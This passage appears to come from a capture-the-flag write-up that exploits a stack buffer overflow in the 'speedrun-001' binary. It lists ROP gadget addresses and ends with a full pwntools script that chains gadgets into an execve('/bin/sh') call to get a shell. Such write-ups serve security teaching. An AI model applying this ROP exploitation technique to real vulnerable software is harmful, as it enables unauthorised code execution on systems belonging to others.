The key takeaways from this initial analysis are:

  - It's a **64-bit** ELF executable.
  - It's **statically linked**, meaning all necessary libraries are compiled directly into the binary. This makes the binary much larger but provides a wealth of potential ROP gadgets.
  - The **stack canary is disabled**, so we don't have to worry about a canary value preventing a stack overflow.
  - **NX (Non-Executable Stack) is enabled**, which means we can't simply inject shellcode onto the stack and jump to it. This forces us to use ROP.
  - **PIE (Position Independent Executable) is disabled**, which is a huge advantage. This means the addresses of all functions and ROP gadgets are static and won't change each time the program runs.

To figure out where the vulnerability lies, we can use a debugger like `gef` to trace the program's execution. We can interrupt the program after it asks for input and use the `bt` (backtrace) command to see the call stack. This points us toward a function at `0x400b60`.

Decompiling this function in Ghidra reveals a clear vulnerability:

```c
void interesting(void)
{
  undefined input [1024];
 
  FUN_00410390("Any last words?");
  FUN_004498a0(0,input,2000);
  FUN_0040f710("This will be the last thing that you say: %s\n",input);
  return;
}
```

The `FUN_004498a0` function (which wraps a `read` syscall) reads up to **2000 bytes** of input into a local buffer named `input`, which can only hold **1024 bytes**. This is a classic stack-based buffer overflow. We can write beyond the buffer's boundary and overwrite the saved return address on the stack.

To find the exact offset to the return address, we can again use `gef`. By setting a breakpoint just before the vulnerable function returns and providing a unique input pattern, we can inspect the stack.

The offset from the start of our input buffer to the saved return address is **0x408 bytes**. This is the amount of padding we need to send before our ROP chain.

### Building the ROP Chain

Since NX is enabled, we'll use ROP to achieve code execution. Our goal is to perform an `execve("/bin/sh", 0, 0)` syscall to get a shell. Looking at the x86-64 syscall table, we know we need to set the following registers:

  - `rax`: `59` (the syscall number for `execve`)
  - `rdi`: Address of the string `"/bin/sh"`
  - `rsi`: `0` (for the arguments)
  - `rdx`: `0` (for the environment variables)

Our ROP chain will be structured to perform these steps:

1.  **Write `/bin/sh` to memory:** We need a writable memory location. The binary's `.data` section, from `0x6b6000` to `0x6bc000`, has `rw-` permissions. We'll use the address `0x6b6000`. We'll use a `mov qword ptr [rax], rdx ; ret` gadget to write the string to this location.
2.  **Populate the registers:** We'll use a series of `pop [register] ; ret` gadgets to set `rax`, `rdi`, `rsi`, and `rdx` to their required values.
3.  **Execute the syscall:** We'll find a `syscall` gadget to trigger the `execve` call.

We can find these gadgets easily using a tool like ROPgadget.

```bash

$ python ROPgadget.py --binary speedrun-001 | grep "pop rdi ; ret"

$ python ROPgadget.py --binary speedrun-001 | grep "pop rsi ; ret"
```

Now we have all the pieces we need:

  - **Padding:** `0x408` bytes
  - **ROP gadgets:**
      - `pop rax; ret` at `0x415664`
      - `pop rdi; ret` at `0x400686`
      - `pop rsi; ret` at `0x4101f3`
      - `pop rdx; ret` at `0x4498b5`
      - `mov qword ptr [rax], rdx; ret` at `0x48d251`
      - `syscall` at `0x40129c`
  - **Writable address:** `0x6b6000`
  - **String:** `"/bin/sh\x00"`



Putting it all together, our exploit script will construct a payload with the padding followed by the ROP chain.

1.  **First part of the ROP chain (writing `/bin/sh`):**
      - `pop rax; ret` gadget to set `rax` to `0x6b6000`.
      - `pop rdx; ret` gadget to set `rdx` to `"/bin/sh\x00"`.
      - `mov qword ptr [rax], rdx; ret` gadget to write the string to memory.
2.  **Second part of the ROP chain (setting syscall arguments):**
      - `pop rax; ret` gadget to set `rax` to `59`.
      - `pop rdi; ret` gadget to set `rdi` to the address of our string, `0x6b6000`.
      - `pop rsi; ret` gadget to set `rsi` to `0`.
      - `pop rdx; ret` gadget to set `rdx` to `0`.
3.  **Final part of the ROP chain (syscall):**
      - `syscall` gadget to execute the `execve` syscall.
        
final exploit script:


```python
from pwn import *

target = process('./speedrun-001')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

# --- Stage 1: Write "/bin/sh" to a writable memory location ---
rop = b''
rop += popRax
rop += p64(0x6b6000) # Destination address
rop += popRdx
rop += b"/bin/sh\x00" # String to write
rop += writeGadget

# --- Stage 2: Set up registers for execve syscall ---
rop += popRax
rop += p64(59) # Syscall number for execve
rop += popRdi
rop += p64(0x6b6000) # Pointer to "/bin/sh"
rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

# --- Stage 3: Execute the syscall ---
rop += syscall

# Add the padding to the saved return address
payload = b"A"*0x408 + rop

# Send the payload and get an interactive shell
target.sendline(payload)
target.interactive()
```
